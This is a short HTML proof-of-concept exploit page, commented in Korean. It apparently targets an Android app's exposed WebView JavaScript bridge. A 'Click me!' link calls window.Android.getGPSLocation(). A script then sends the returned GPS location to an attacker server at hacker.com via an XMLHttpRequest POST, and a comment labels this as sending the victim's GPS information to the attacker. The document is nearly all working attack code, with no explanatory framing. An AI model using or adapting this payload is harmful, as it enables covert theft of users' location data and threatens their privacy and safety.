 <html><head><script>
 function send_gpsinfo(gps_info)
 { 
 // gps 정보 출력 
 document.getElementById("result").innerHTML = gps_info; 
 
 // 공격자 서버로 피해자의 gps 정보를 전송
 client = new XMLHttpRequest();
 client.open('POST', 'https://hacker.com/saveGPSinfo.php',true);
 client.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 client.send("gpsinfo=" + gps_info);
 }   
 </script></head><body><center>
 
 <!-- 딥링크 -->
 <a href="javascript:window.Android.getGPSLocation();">Click me!</a>
 
 <div id="result"></div>
 </center></body></html>